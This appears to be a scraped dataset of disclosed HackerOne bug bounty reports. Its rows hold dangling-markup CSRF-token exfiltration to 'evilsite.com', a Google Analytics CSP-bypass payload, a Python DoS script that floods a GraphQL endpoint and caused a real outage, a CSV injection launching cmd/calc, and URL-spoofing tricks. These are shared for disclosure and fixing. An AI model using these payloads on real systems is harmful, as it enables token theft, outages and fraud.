As part of the HackerOne Culture, at least once a year we host a Hack Day, or more recently, a Hack week. This is a place for HackerOnies (HackerOne employees) to do a project outside the regular duties, might have something to do with the HackerOne platform or not, might be an artistic project, a video game, or a coloring book or some exciting new feature that can be achieved in this period of time.
The idea is to hack our way into creating something new that could help some people, or make someone happy.
As part of past Hack Days, many features known today were released. Things like hacker badges, leaderboards, the Live Hacking Event dashboard, and much more have all derived from a hack day of the past. 
This time, Hack Week's theme was Summer Camp, and this is the logo. 
Image F1330772: Summercamp.png 50.38 KiBZoom in Zoom out Copy Download
So, back to our report.
As part of the Summer Camp Hack Week, I proposed to work on supporting a new type of payment to our hackers. The idea was to add to our Coinbase Crypto payments, a different type of coin rather than only supporting BTC.
This is not new, this has been requested from many of you, and also some members of our Hacker Advisory board.
So, with the amazing help of some folks from the engineering team, finance, and Solution architect team, we started working on this. 
The reason that  this report was created is to award a minimum bounty on this currency to confirm things are working as expected. 
If you are finally reading this on Hacktivity, it might mean it worked and now we are supporting payments in USDC crypto via Coinbase, so make sure you upvote this report so everyone can see it!
Thanks to everyone involved on this Hack Week project, specially to:

@bencode
Alexander Jeurissen
Daniel Berube
Dane Sherret
Diego Carrea

TogetherWeHitHarder
Steps To Reproduce
Here are the steps to configure USDC coin via Coinbase as Payout Method.

Log in on your HackerOne account
At the top right, click on the down arrow next to your profile pic, and click on “Settings”
On the menu at the left, scroll down and click on “Payout preferences”
Now, you need to click on “Add payout method”
You will now see the option of selecting the payout method in USDC coin via Coinbase

Impact
A feature requested by many of our hackers is now supported by HackerOne. Hope this has a huge impact on many hacker bounties!1 attachment:F1330772: Summercamp.pngbencode HackerOne staff  changed the status to Triaged. Jun 8th (about 1 year ago)HackerOne  rewarded arl_rose with a $1 bounty. Jun 8th (about 1 year ago)Here's a stable coin payout to keep your payments grounded! 💰bencode HackerOne staff  changed the report title from HackerOne accepting payments in USDC (Coinbase stable coin) to HackerOne making payments in USDC (Coinbase stable coin). Jun 13th (about 1 year ago)bencode HackerOne staff  closed the report and changed the status to Resolved. Jun 17th (about 1 year ago)bencode HackerOne staff  requested to disclose this report. Jun 17th (about 1 year ago)
    
    
        
            
                
                
                
            
        
    
arl_rose   agreed to disclose this report. Jun 17th (about 1 year ago)Well, that $1 USDC bounty payment worked like a charm!
Thanks @bencode for such an amazing work in such a brief period of time. I know a lot of hackers will find this very useful, and they will be happy to have this option.
Well, I know I am!
Image F1342388: jimmy.gif 1.20 MiBZoom in Zoom out Copy Download
Cheers!1 attachment:F1342388: jimmy.gif  This report has been disclosed. Jun 17th (about 1 year ago)",https://hackerone.com/reports/1220747,California,United States,San Francisco,2021,6,8,21,38
HackerOne,1001-5000,0.0,10m-50m,"$7,500.00",High,7.95,Information Disclosure,Internal Gitlab Ticket Disclosure via External Slack Channels,"none_of_the_above  submitted a report to HackerOne.Jul 22nd (about 1 year ago)Summary by none_of_the_aboveHackerOne Pentest Team is a group of external hackers who are selected to perform specific engagements on HackerOne. As part of this team, I have access to a Slack Workspace which is used to coordinate engagements and communicate with customers. On July 22nd I replied to a message from another pentester who was reporting a functional bug on the platform. In my reply, I included a Gitlab link with the intention of pointing out that his report was a duplicate of an internal issue which had already been reported by another hacker. I noticed that the link automatically displayed a preview of the internal ticket, which of course, should only be seen by employees. Since Gitlab issue IDs are sequential, I tried iterating the IDs and discovered that I could access partial info from any internal Gitlab issue. The engineering team promptly implemented a fix and even discovered other ways in which this vulnerability may have been abused.",https://hackerone.com/reports/1273292,California,United States,San Francisco,2021,7,22,13,19
HackerOne,1001-5000,0.0,10m-50m,"$2,500.00",Medium,5.0,Information Disclosure,"Leaked H1's Employees Email addresses,meeting info on private bug bounty program ████████","superman85  submitted a report to HackerOne.Jul 30th (about 1 year ago)Summary:
Dear Team,
I am finding bugs on this private program █████████ and after logged in with provided credential.
I have search some peoples in the list and I have seen Hackerone's employee account there.
Looking at H1 personal stuff some sensitive information are exposed like email addresses, meeting info etc ...
Steps to reproduce

Login ██████████ (if you did not have acc, please ask the program owner!)
Go to this person link ██████ - █████ (████) 
You can see email addresse, meeting info via PoC below

█████
██████████
I am looking for other persons and will update information if I find something interesting
IMO you should not use work email address on dev/test environment of partner!
Impact
Leaked some H1's employees email addresses",https://hackerone.com/reports/1285115,California,United States,San Francisco,2021,7,30,17,40
HackerOne,1001-5000,0.0,10m-50m,$500.00,Low,3.7,Violation of Secure Design Principles,Google Analytics could be used as CSP bypass for data exfiltration on hackerone.com,"aaron_costello  submitted a report to HackerOne.Jan 19th (6 years ago)Greetings, I believe I may have found a way to bypass CSP on hackerone.com
The issue lies here:
Code 45 BytesWrap lines Copy Download1img-src 'self' data: www.google-analytics.com
As you can imagine, how can image tags be used maliciously here to this safe site? Well, as you know, on google-analytics.com we have the ability to host user content.
Before we get into that, lets look at how image tags are processed.
Consider the following injected content:
Code 53 BytesWrap lines Copy Download1<img src='https://evilsite.com/steal_csrf_token?html=
A tag with an unclosed quote will capture all output up to the next matching quote. This could include security sensitive content on pages in the following way,:
Code 173 BytesWrap lines Copy Download1<img src='https://evilsite.com/steal_csrf_token?html=
2<form action=""https://coinbase.com/poc"">
3
4<input type=""hidden"" name=""csrf_token"" value=""some_csrf_token_value"">
5</form>
The resulting image element will send a request to https://evilsite.com/steal_csrf_token?html=/log_csrf?html=...some_csrf_token_value....
As a result, an attacker can leverage this dangling markup attack to exfiltrate CSRF tokens to a site of their choosing.
The issue
First take a look at Google Analytics. Imagine a content injection that looks something like:
Code 33 BytesWrap lines Copy Download1< injection point >
2<p>secret</p>
The Google Analytics’ ea parameter is used to log event actions and can contain arbitrary strings. An attacker could setup a Google Analytics account and then inject an image referencing their account:
Code 175 BytesWrap lines Copy Download1<img src='https://www.google-analytics.com/collect?v=1&tid=UA-55300588-1&cid=3121525717&t=event&ec=email&el=2111515817&cs=newsletter&cm=email&cn=062413&cm1=1&ea=
2<p>secret</p>
This results in the following request, logging “secret” to their account:
Code 172 BytesWrap lines Copy Download1https://www.google-analytics.com/collect?v=1&tid=UA-77300477-1&cid=2111515817&t=event&ec=email&el=2111515817&cs=newsletter&cm=email&cn=062413&cm1=1&ea=%3Cp%3Esecret%3C/p%3E
The solution
Swap from using their image based system to an XHR based approach (https://developers.google.com/analytics/devguides/collection/analyticsjs/sending-hits#specifying_different_transport_mechanisms)",https://hackerone.com/reports/199779,California,United States,San Francisco,2017,1,19,23,35
HackerOne,1001-5000,0.0,10m-50m,"$2,500.00",No value,0.0,Cross-site Scripting (XSS) - Generic,Send AJAX request to external domain,"abze  submitted a report to HackerOne.Nov 2nd (7 years ago)Hello!
I would like to report about ability to send AJAX request from hackerone.com to external domain.
Here is PoC for the last version of Internet Explorer: https://hackerone.com/bugs?subject=%2Fbigbob.lv%2F1337.php%3Fdata%3D
If You visit it, You can see Hello! This is custom text from external domain text which is from JSON here https://bigbob.lv/1337.php
You can check console and see there 3 AJAX requests sent from hackerone.com to bigbob.lv.
It is possible because there is no filtration of / slash in JavaScript when it handles subject GET param. So, it allows to send AJAX requests to external domain because of //.
This PoC will work in old versions of popular browsers which don't support CSP (http://caniuse.com/#feat=contentsecuritypolicy).
I will try to achieve XSS.
Thanks!",https://hackerone.com/reports/97191,California,United States,San Francisco,2015,11,2,1,7
HackerOne,1001-5000,0.0,10m-50m,"$2,500.00",No value,0.0,Open Redirect,Cross-domain AJAX request,"bohdansec  submitted a report to HackerOne.Nov 5th (7 years ago)Hi,
Two weeks ago, I found a Cross-domain AJAX request, but due to the fact that you uses a very strict Content Security Policy, I hesitated to send this. Today, I noticed that bug has been fixed. But this fix can be bypassed.
This example not working now (screenshot 1):
https://hackerone.com/bugs?subject=/google.com/
But if will be (screenshot 2):
https://hackerone.com/bugs?subject=/hackerone.com@google.com/
or https://hackerone.com/bugs?subject=%2Fhackerone.com.google.com
It's will work. 2 attachments:F60352: 1.jpgF60353: 2.jpg",https://hackerone.com/reports/97948,California,United States,San Francisco,2015,11,5,2,2
HackerOne,1001-5000,0.0,10m-50m,$500.00,No value,0.0,Violation of Secure Design Principles,homograph attack. IDNs displayed in unicode in bug reports and on external link warning page,"mrrm  submitted a report to HackerOne.Sep 30th (8 years ago)the IDN: http://ebаy.com/
is a homograph for the latin ebay.com. if you click that first link, youm might think that you are going to ebay.com. in fact, you are going to a homograph url http://xn--eby-7cd.com/
more info http://www.chromium.org/developers/design-documents/idn-in-google-chrome
more info http://www.charset.org/punycode.php?encoded=http%3A%2F%2Fxn--eby-7cd.com%2F&decode=Punycode+to+normal+text
it would be safer to show the punycode version of the url so that it would be apparent that something weird is going on. that is, show http://xn--eby-7cd.com/ instead of http://ebаy.com/1 attachment:F17804: h11.png",https://hackerone.com/reports/29491,California,United States,San Francisco,2014,9,30,18,51
HackerOne,1001-5000,0.0,10m-50m,$500.00,Low,2.0,Open Redirect,Domain spoofing in redirect page using RTLO,"ashish_r_padelkar  submitted a report to HackerOne.Dec 19th (5 years ago)Summary:
Hello,
Domains can be spoofed on redirect page using RTLO. 
Description (Include Impact):
Using  http://username@domain.com & RTLO method, i found a way where redirect page host detection can be spoofed
Steps

Insert this on report  [Just Click Here](https://google.com@%E2%80%AE@moc.rettiwt)
On click of link, it will redirect to /redirect page . Here you will see that Twitter.com is highlighted domain. see screen shot below
Ideally, if there is any malformed url, it shows some kind of warning but not in this case.
Click on Proceed button and you will be redirected https://moc.rettiwt/ instead

Browser version, Device, etc
Tested on chrome for Mac but should work in all browsers
POC link
https://google.com@%E2%80%AE@moc.rettiwt
Screenshots
 Image F248121: Screen_Shot_2017-12-19_at_10.08.08_PM.png 55.57 KiBZoom in Zoom out Copy Download
Impact
This can be used to spoof urls on hackerone 
Regards,
Ashish1 attachment:F248121: Screen_Shot_2017-12-19_at_10.08.08_PM.png",https://hackerone.com/reports/299403,California,United States,San Francisco,2017,12,19,16,42
HackerOne,1001-5000,0.0,10m-50m,$100.00,No value,0.0,Cross-Site Request Forgery (CSRF),Information disclosure (reset password token) and changing the user's password,"dawidczagan  submitted a report to HackerOne.Jan 17th (9 years ago)The user gets an e-mail with password recovery link, which includes reset password token. The user clicks this link and is expected to enter a new password twice. Before entering the password the user clicks a link to a picture (https://xkcd.com/936/). When this happens, cross-domain referer leakage takes place. 
GET /936/ HTTP/1.1
Host: xkcd.com
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: pl,en-us;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://hackerone.com/users/password/edit?reset_password_token=HERE_IS_THE_VALUE_OF_RESET_PASSWORD_TOKEN
Connection: keep-alive
It allows the person who has control of xkcd.com to change the user's password (CSRF attack), because this person knows reset password token of the user, uses a new user's password of his choice and authenticity_token is not needed to make it happen.",https://hackerone.com/reports/738,California,United States,San Francisco,2014,1,17,0,49
HackerOne,1001-5000,0.0,10m-50m,"$2,500.00",Medium,6.1,Denial of Service,Uploading large payload on domain instructions causes server-side DoS,"dogpiss  submitted a report to HackerOne.May 30th (2 years ago)Summary by dogpissNote : To everyone who sees this report, if a program accepts DoS vulnerabilities please try to try test carefully as it is not ideal to disrupt services for everyone. I would advise you that when testing for DoS, once you receive an error and get huge amounts of delays please stop immediately, and report right away. Do not do what I did on this report. Thank you!

On the program sandbox I have found that when creating domain instructions when adding a scope there is no input validation which was the cause of the server-side DoS. The character limit on the big input boxes is set to 10k, however with this I observed that there was not any, at first I reported this as a client-side DoS because it would render the scope management page unusable and there was no way to delete it, it was then closed as a duplicate of #584030 however digging further into this, I made a python script that allowed me to upload large amounts of payloads every request I then put it into a loop and around 350+ request I noticed an HTTP 500 Internal Server Error I then stopped to see if I had caused disruption, at first the page were loading fine so I run the python script again (note : I was running this python script on 4 terminals) and again, after a while this is when I noticed disruption on my side, and to confirm I asked the people from discord if they got disruption and they did. They received an a 502, and a 504 HTTP errors, and caused disruption on my side as well.
Python Script (note: you need to put your own cookies if you want to try)
Code 2.80 KiB1
2import requests
3
4g = input(""Enter : "") 
5
6burp0_url = ""https://hackerone.com:443/graphql""
7burp0_cookies = x
8burp0_headers = {""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0"", ""Accept"": ""*/*"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Accept-Encoding"": ""gzip, deflate"", ""Referer"": ""https://hackerone.com/testingfordos/scopes/new"", ""content-type"": ""application/json"", ""X-Auth-Token"": ""eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1OTI1MzI0MzV9.qyfpwC--aQXOLd9TQ7l-016rI0wXZ33ocCvL10DU6dc----5047344"", ""Origin"": ""https://hackerone.com"", ""Connection"": ""close""}
9
10a = """"
11
12for i in range(15000):    
13    a += ""بٍٍٍٍََُُُِّّّْرٍٍٍٍََُُِِّّّْآٍٍٍَُّ""
14
15for i in range(50):
16
17    burp0_json={""operationName"": ""CreateStructuredScope"", ""query"": ""mutation CreateStructuredScope($team_id: ID!, $asset_type: StructuredScopeAssetTypeEnum, $asset_identifier: String!, $eligible_for_bounty: Boolean, $eligible_for_submission: Boolean, $instruction: String, $availability_requirement: String, $confidentiality_requirement: String, $integrity_requirement: String, $reference: String, $notify_subscribers_of_changes: Boolean, $custom_message: String, $label_ids: [ID!]) {\n  createStructuredScope(input: {team_id: $team_id, asset_type: $asset_type, asset_identifier: $asset_identifier, eligible_for_bounty: $eligible_for_bounty, eligible_for_submission: $eligible_for_submission, instruction: $instruction, availability_requirement: $availability_requirement, confidentiality_requirement: $confidentiality_requirement, integrity_requirement: $integrity_requirement, reference: $reference, notify_subscribers_of_changes: $notify_subscribers_of_changes, custom_message: $custom_message, label_ids: $label_ids}) {\n    was_successful\n    team {\n      id\n      structured_scopes(first: 500) {\n        edges {\n          node {\n            id\n            __typename\n          }\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    errors(first: 100) {\n      edges {\n        node {\n          id\n          type\n          field\n          message\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"", ""variables"": {""asset_identifier"": str(i) + str(g) + "".com"", ""asset_type"": ""URL"", ""availability_requirement"": ""high"", ""confidentiality_requirement"": ""high"", ""eligible_for_bounty"": True, ""eligible_for_submission"": True, ""instruction"": a+a+a+a+a+a+a+a+a+a, ""integrity_requirement"": ""high"", ""label_ids"": [], ""notify_subscribers_of_changes"": True, ""reference"": ""sadasdasdas"", ""team_id"": ""Z2lkOi8vaGFja2Vyb25lL1RlYW0vNDkwNzg=""}}
18
19    x = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)
20    print(str(x.status_code) + "" Status - Delay : "" + str(x.elapsed.total_seconds()) + "" seconds"")
21    print(x._content)
Steps To Reproduce :


Add a domain on Scope Management
Intercept this POST /graphql the one with the ""operationName"":""CreateStructuredScope""
Now put a huge payload on instruction parameter and keep sending it
Reload pages until disruption is observed


The report was then triaged right 10 mins after reporting, and I was told by @jobert to stop my test. The team then rolled a fix which looked like this :
Code 876 Bytes1diff --git a/app/models/structured_scope.rb b/app/models/structured_scope.rb
2index f975f383c4..6c3928d2a7 100644
3--- a/app/models/structured_scope.rb
4+++ b/app/models/structured_scope.rb
5@@ -97,7 +97,8 @@ class StructuredScope < ApplicationRecord
6     AVAILABILITY_REQUIREMENT,
7   ].freeze
8
9-  MAX_INSTRUCTION_LENGTH = 5000
10+  MAX_INSTRUCTION_LENGTH = 10000
11+  MAX_REFERENCE_LENGTH = 1000
12
13   validates :asset_identifier, presence: true
14   validates :asset_type, inclusion: { in: ASSET_TYPES }
15@@ -109,7 +110,8 @@ class StructuredScope < ApplicationRecord
16   }
17   validate :eligibility
18   validates_with CountryValidator, fields: [:country], alpha2: true
19-  validates :instruction, length: { maximum: MAX_INSTRUCTION_LENGTH }, on: :create
20+  validates :instruction, length: { maximum: MAX_INSTRUCTION_LENGTH }
21+  validates :reference, length: { maximum: MAX_REFERENCE_LENGTH }
As you can see, there is now input validation to this which immediately stopped the server-side DoS from happening as it would block the request. Again, please test responsibly for DoS vulnerabilities responsibly don't cause harm to program's services. Thank you! :)",https://hackerone.com/reports/887321,California,United States,San Francisco,2020,5,30,5,59
HackerOne,1001-5000,0.0,10m-50m,$500.00,No value,0.0,Command Injection - Generic,CSV Injection via the CSV export feature,"zombiehelp54  submitted a report to HackerOne.Jan 17th (7 years ago)Hi , I have managed to bypass your fix for #72785 by submitting a report with NewLine character (0x0a) in the title before the CSV formula.
#Steps to reproduce: 

As a researcher , Submit a report to a program with the title %0A-2+3+cmd|' /C calc'!D2 , here is an example request: 

Code 725 BytesWrap lines Copy Download1POST https://hackerone.com/security/reports/ HTTP/1.1
2accept: application/json, text/javascript, */*; q=0.01
3accept-encoding: gzip, deflate
4accept-language: ar,en-US;q=0.8,en;q=0.6
5content-length: 165
6content-type: application/x-www-form-urlencoded; charset=UTF-8
7cookie: <Your_session_cookies>
8origin: https://hackerone.com
9referer: https://hackerone.com/
10user-agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36
11x-csrf-token: <your_token>
12x-requested-with: XMLHttpRequest
13Host: hackerone.com
14
15report%5Btitle%5D=%0A-2%2B3%2Bcmd%7C'+%2FC+calc'!D2&report%5Bvulnerability_information%5D=test&report%5Bvulnerability_type_ids%5D%5B%5D=85553&report%5Bforce%5D=false

As a response team, Go to Reports page then export the report as CSV.
open the CSV file and you'll see that the cell is active.

Thanks",https://hackerone.com/reports/111192,California,United States,San Francisco,2016,1,17,2,40
HackerOne,1001-5000,0.0,10m-50m,$500.00,No value,0.0,None,HTTP Parameter Pollution using semicolons in iframe element at hackerone.com/careers allows loading external Greenhouse forms,"kapytein  submitted a report to HackerOne.Dec 15th (5 years ago)Summary:
I noticed that HackerOne career pages loads it's application forms from Greenhouse.io via an iframe. The gh_jid parameter value is taken into the iframe element for the token parameter in the iframe URL (boards.greenhouse.io). Any html characters are escaped in order to avoid XSS (and possibly also to avoid any additional parameters to be included to avoid that parameters are overridden). However, I have discovered that I could load any form on the page.
Description (Include Impact):
Basically, you can load any form of Greenhouse.io via a GET request. I am not entirely sure how Greenhouse works (I also can not discover how it actually works since you only have paid subscriptions at Greenhouse), but you might also be able to craft pages instead of forms only (which would be more effective for a phishing attack, than only a form).
This happens because due to the fact that you can include a semicolon in the iframe element. As stated on https://en.wikipedia.org/wiki/Query_string, a semicolon can be used besides the ampersand in URLs embedded in HTML. 
Steps To Reproduce

Go to https://www.hackerone.com/careers?gh_jid=795069;for=airbnb for example.
You will notice an AIrbnb application form being loaded on the page.

(I sadly could not test my own forms, hence why I have used Airbnb forms to load on the page, as stated above).
A fix would be to either escape the semicolon, or to adjust the position of the for parameter in the iframe URL to avoid the URL being overridden. 
Example for changing the order of the URLs:

https://boards.greenhouse.io/embed/job_app?for=hackerone&token=795069;for=airbnb&b=https%3A%2F%2Fwww.hackerone.com%2Fcareers (this would load the form as the parameter is overridden).

with

https://boards.greenhouse.io/embed/job_app?token=795069;for=airbnb&b=https%3A%2F%2Fwww.hackerone.com%2Fcareers&for=hackerone (this would not load the form as the parameter is not overridden).

PS: After my pretty much failed report (#289999) (which was valid, but the way I described the vulnerability made it invalid), I appreciate any feedback on the quality of my report! Thanks in advance.
Impact
An attacker can load any other forms on the page, and possibly craft pages as well, but that depends on how Greenhouse.io actually works with it's forms. Therefore, a phishing attack would be possible.Summary by kapyteinUsing semicolons, I was able to override the for parameter in the iframe element. This allowed me to load external Greenhouse forms (which are not owned by HackerOne) on the page. Later on, a global fix was applied by Greenhouse on the boards.greenhouse.io/embed/ endpoint.",https://hackerone.com/reports/298265,California,United States,San Francisco,2017,12,15,14,29
HackerOne,1001-5000,0.0,10m-50m,"$2,500.00",Medium,5.45,Violation of Secure Design Principles,"Indexing of urls on the ""External link warning"" pages discloses many vulnerable endpoints from the past and unlisted videos/photos",nagli  submitted a report to HackerOne.Nov 13th (2 years ago),https://hackerone.com/reports/1034257,California,United States,San Francisco,2020,11,13,21,49
HackerOne,1001-5000,0.0,10m-50m,$500.00,No value,0.0,Command Injection - Generic,CSV Injection with the CVS export feature,"appsec3  submitted a report to HackerOne.Jun 26th (7 years ago)The ""Download as a CSV"" feature of HackerOne does not properly ""escape"" fields. This allows an adversary to turn a field into active content so when a response team download the csv and opens it, the active content gets executed. Here is more information about this issue: http://www.contextis.com/resources/blog/comma-separated-vulnerabilities/
Here is one method to reproduce this issue:

As a researcher, I can report an issue with a name starting with ""=1+1""
As a response team, I choose to export all issues found to CSV containing the issue in (1)
As a response team, I now open this CSV file in excel or another spreadsheet program
You can see the cell containing the issue name in (1) is displayed as ""2"" which means the code is executed.

Mitigation:
Ensure all fields are properly ""escaped"" before returning the CSV file to the user.",https://hackerone.com/reports/72785,California,United States,San Francisco,2015,6,26,19,53
HackerOne,1001-5000,0.0,10m-50m,$150.00,No value,0.0,Violation of Secure Design Principles,Logical issues with account settings,"introvertmac  submitted a report to HackerOne.Jan 1st (9 years ago)earlier email was not allowed to change ,but now there is no verification on changing email. when user try to change the password , they were asked to verify the request by entering old password. For the same reason a verification should be there on changing email.The worst part is hackone send verification mail on new mail id , and change the ""join "" date even on email change request.
scenario: if some one left his account open on public computer(say office or cafe), then attacker can change the email ,verify it himself. Then abuse forgot password field to take over whole account.
Suggested mitigation: a password field can be applied(just like facebook do) or verification mail should be send on old email id registered. 1 attachment:F2419: 12.PNG",https://hackerone.com/reports/546,California,United States,San Francisco,2014,1,1,15,23
HackerOne,1001-5000,0.0,10m-50m,$100.00,No value,0.0,Improper Authentication - Generic,Improper session management,"dawidczagan  submitted a report to HackerOne.Jan 16th (9 years ago)When a request with an invalid authenticity_token is received, the user is logged out (tested for updating user's profile, which is available here: https://hackerone.com/diekatze/profile/edit) and the user receives a new session cookie, which is not authenticated at this point. However, the authenticated session cookie used by a user before logging out is still active.
Regards,
Dawid Czagan",https://hackerone.com/reports/737,California,United States,San Francisco,2014,1,16,23,48
HackerOne,1001-5000,0.0,10m-50m,$100.00,No value,0.0,Cross-Site Request Forgery (CSRF),CSRF login,"andrisatteka  submitted a report to HackerOne.Jan 3rd (9 years ago)1) Attacker creates a fake account and changes e-mail
2) The e-mail confirmation link can now be used to CSRF login someone into the fake account, then monitor actions performed by the victim or even interact with him.",https://hackerone.com/reports/547,California,United States,San Francisco,2014,1,3,11,22
Harvest,51-100,0.0,1m-10m,$300.00,Medium,5.45,Cross-site Scripting (XSS) - Reflected,[platform.harvestapp.com] Reflected XSS in Error Message via URL parameters,"ysx  submitted a report to Harvest.May 8th (6 years ago)Hi @jorgeleria,
I came across a potential reflected XSS vector while exploring platform.harvestapp.com functionality. At present, I have been unable to locate a functional payload, so would like to report this as HTML injection.
Proof of Concept
Steps to reproduce

Visit the below Demonstration URL
Select ""Start Timer""
The ""Namespace"" error message will present the unsanitised HTML (a marquee)

Demonstration URL
Code 224 BytesWrap lines Copy Download1https://platform.harvestapp.com/platform/timer?app_name=TestCompany&closable=false&permalink=http://example.com/1/'""><h1><marquee>Test HTML</marquee></h1>&external_item_id=1&external_item_name=Test - Please click Start Timer
Screenshot
Image F182792: Harvest_HTML.png 37.21 KiBZoom in Zoom out Copy Download
Please let me know if you require any additional details regarding this vulnerability.
Thanks!1 attachment:F182792: Harvest_HTML.pngSummary by ysxThe Harvest Timer was vulnerable to reflected XSS via unsanitised HTML in an invalid namespace error message. At the time of testing, the final payload bypassed XSS Auditor protections upon selecting ""Start Timer.""",https://hackerone.com/reports/226960,New York,United States,New York,2017,5,8,19,37
Harvest,51-100,0.0,1m-10m,$400.00,Medium,4.3,Business Logic Errors,"Client can redirect payment, causing payment discrepancy between Harvest and PayPal","jobert  submitted a report to Harvest.Apr 7th (6 years ago)Vulnerability details
When a client views an invoice through the web interface, it'll show a ""Pay with PayPal"" button when a standard PayPal integration has been enabled. Clicking this button will submit a POST request to PayPal. This request contains a business parameter, which is the receiver of the funds. When the client would have two PayPal addresses, it can send money to itself, while the invoice in Harvest will be marked as paid. This causes a discrepancy between Harvest and PayPal.
Proof of concept
To reproduce this vulnerability, make sure you've set up a Harvest account that has PayPal payments enabled. This can be done at https://subdomain.harvestapp.com/invoices/configure#online_payment_edit. After that, send an invoice to a client and make sure the web view is enabled. The client will receive an email with the invoice and will be able to view the invoice.
Image F173955: Screen_Shot_2017-04-06_at_21.43.52.png 211.36 KiBZoom in Zoom out Copy Download
When the client clicks on the button, a request similar to the one shown below will be send to PayPal:
Request
Code 413 BytesWrap lines Copy Download1...
2----------1635625368
3Content-Disposition: form-data; name=""quantity""
4
51
6----------1635625368
7Content-Disposition: form-data; name=""business""
8
9paypal@myconsultancy.com
10----------1635625368
11Content-Disposition: form-data; name=""item_number""
12
132
14----------1635625368
15Content-Disposition: form-data; name=""item_name""
16
17Invoice #2 from Michiel's Ranch - That second invoice you asked for!
18...
19----------1635625368--
20
The parameter to look out for is the business parameter. As can be seen in the request above, it contains the value the Harvest account holder has put in - paypal@myconsultancy.com. When the client (the attacker) changes this to a non-existing email address and checks out with its own PayPal account, it'll send the money to itself. After the checkout, the callback to Harvest will actually set the Harvest invoice to paid.
Image F173957: Screen_Shot_2017-04-06_at_21.53.57.png 221.73 KiBZoom in Zoom out Copy Download
Even though I understand that it's the consultant's responsibility to double-check funds that've received in its PayPal account, it can cause a lot of fuss if the invoice in Harvest has been marked as paid and has a valid PayPal transaction ID linked to it. From what I've seen, it isn't possible to see where the money actually went. This may cause friction between the consultant and client if the client decides to go down this path.2 attachments:F173955: Screen_Shot_2017-04-06_at_21.43.52.pngF173957: Screen_Shot_2017-04-06_at_21.53.57.pngjorgeleria Harvest staff  changed the status to Triaged. Apr 10th (6 years ago)Hi Jobert,
Thanks a lot for the high quality report! We are looking into it right now.
I'll contact you as soon as it is fixed :)
Cheers,
Jorgejorgeleria Harvest staff  posted a comment. Apr 11th (6 years ago)Hi again Jobert, we just deployed a fix for this issue.
Could you verify if you are still able to reproduce it?
Thanks!
    
    
        
            
                
                
                
            
        
    
jobert   posted a comment. Updated Apr 11th (6 years ago)Hi @jorgeleria - thanks for the quick turnaround! I tried to reproduce the vulnerability and was unable to. When I paid the invoice to myself again, the payment went through, but the invoice wasn't marked as paid, nor was the payment tracked in Harvest. High five!jorgeleria Harvest staff  closed the report and changed the status to Resolved. Apr 11th (6 years ago)Thanks for the confirmation!
I'm changing the status to Resolved and we'll be awarding a bounty for this very soon.jobert   requested to disclose this report. Apr 11th (6 years ago)Harvest  rewarded jobert with a $400 bounty. Apr 11th (6 years ago)Thanks for helping make Harvest more secure!
    
    
        
            
                
                
                
            
        
    
jobert   posted a comment. Apr 11th (6 years ago)Wow, thanks @harvest and @jorgeleria, appreciate it! It's been great working together :)jorgeleria Harvest staff  agreed to disclose this report. Apr 12th (6 years ago)  This report has been disclosed. Apr 12th (6 years ago)",https://hackerone.com/reports/219215,New York,United States,New York,2017,4,7,4,58
Harvest,51-100,0.0,1m-10m,$350.00,Low,2.0,Violation of Secure Design Principles,Content Injection at First & Last Name Parameters that could Lead Fraud Issue,"abcdefghijklmnopqrstuvwxyzabc  submitted a report to Harvest.Jul 20th (6 years ago)I. Introduction
Harvest is a Simple Online Time Tracking Software that could allow people to manage their project timeline with their team. As we can see from the short introduction, Harvest allow the team member to collaborate each other to talk about their project and (mostly) all of those users information are managed by the administrator.
Related the information that the administrator can “managed” the team member account, Harvest trying to protect all of those team member by giving the notification in every changed that conduct by the administrator to specific team member account. The notification is given from email.
But the problem exist when the user is “allowed” to change their First and Last Name with any character that people want to submit (such as “ > < / : . and other).
Generally, Content (which is Text in this case) Injection is an Attack that using the missing input validation at an trusted URL, page, or even form in the specific web application. Usually, this attack can work with the non-aware user that targeted as a victim. In short, based on OWASP, this attack is typically used as, or in conjunction with, social engineering because the attack is exploiting a code-based vulnerability and a user's trust.
.
II. Summary of the Issue
As described above, the issue could allow the Attacker to inject any “Very Convince” message at both of First and Last Name field that didn’t give the validation of the input yet.
.
III. Information
3.1. URL Name: justforPoC.harvestapp.com
.
III. Attack Narrative (Scenario) and Step to Reproduce
4.1. Make sure that there are several team member that could be managed by the Administrator (Harvest 1 - Manage People);
4.2. An administrator edit one of their team member name. As a normal flow, the member will get the notification via email (Harvest 2 - Notification);
4.3. The next step is, an administrator change their First and Last Name to create the “very convince” message to be injected at the change name notification (Harvest 3 - Username Changed at Admin). After that, administrator change the victim first / last name again and the system will automatically give the notification to the victim.
As we can see, the normal message is:

This is a confirmation that your Harvest name was changed by H1Attacker H1Last on the account JustforPoC at 9:55 pm on July 20, 2016.


Your Harvest name is now H1Victim2 H1LastVictim. If this is incorrect, please contact H1Attacker H1Last, or write to Harvest Support.

and the fake message is (Harvest 4 - Notification for User with Fake Admin Username):

This is a confirmation that your Harvest name was changed by Your Administrator. Please kindly take a look into http://evilurl.com to make sure everything goes right. After that, you can comeback to check your status again on the account JustforPoC at 10:06 pm on July 20, 2016.


Your Harvest name is now H1Victim2 H1LastVictim. If this is incorrect, please contact Your Administrator. Please kindly take a look into http://evilurl.com to make sure everything goes right. After that, you can comeback to check your status again, or write to Harvest Support.

.
V. Recommendation
